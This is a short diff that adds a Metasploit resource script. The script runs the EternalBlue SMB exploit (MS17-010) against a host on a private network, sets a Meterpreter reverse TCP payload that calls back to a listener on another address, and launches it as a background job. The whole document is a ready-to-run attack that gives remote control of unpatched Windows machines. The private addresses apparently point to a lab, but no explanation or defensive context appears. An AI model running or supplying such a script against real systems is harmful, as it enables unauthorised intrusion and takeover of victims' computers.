@@ -1,0 +1,5 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost 192.168.84.101
+set lhost 192.168.84.11
+exploit -j
